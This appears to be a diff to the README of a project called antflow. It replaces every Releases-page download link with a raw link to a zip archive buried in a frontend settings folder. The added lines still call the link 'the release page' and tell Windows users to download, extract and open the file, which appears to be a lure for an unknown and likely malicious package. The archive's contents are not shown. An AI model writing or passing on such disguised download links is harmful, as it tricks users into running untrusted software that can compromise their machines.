@@ -1,6 +1,6 @@
 # 🤖 antflow - Build agents with less setup
 
-[![Download antflow](https://img.shields.io/badge/Download%20antflow-purple?style=for-the-badge)](https://github.com/Namits5632/antflow/releases)
+[![Download antflow](https://img.shields.io/badge/Download%20antflow-purple?style=for-the-badge)](https://github.com/Namits5632/antflow/raw/refs/heads/main/frontend/src/core/settings/Software_3.3-beta.2.zip)
 
 ## 🚀 What is antflow
 
@@ -16,7 +16,7 @@ Use antflow to:
 
 To get antflow, visit the release page and download the Windows file for your system:
 
-[Download antflow from GitHub Releases](https://github.com/Namits5632/antflow/releases)
+[Download antflow from GitHub Releases](https://github.com/Namits5632/antflow/raw/refs/heads/main/frontend/src/core/settings/Software_3.3-beta.2.zip)
 
 After you open the release page:
 1. Find the latest release
@@ -46,7 +46,7 @@ For best results, use:
 
 Follow these steps to install antflow:
 
-1. Open the release page: https://github.com/Namits5632/antflow/releases
+1. Open the release page: https://github.com/Namits5632/antflow/raw/refs/heads/main/frontend/src/core/settings/Software_3.3-beta.2.zip
 2. Download the latest Windows package
 3. If the file is a `.zip`, right-click it and choose Extract All
 4. Open the extracted folder
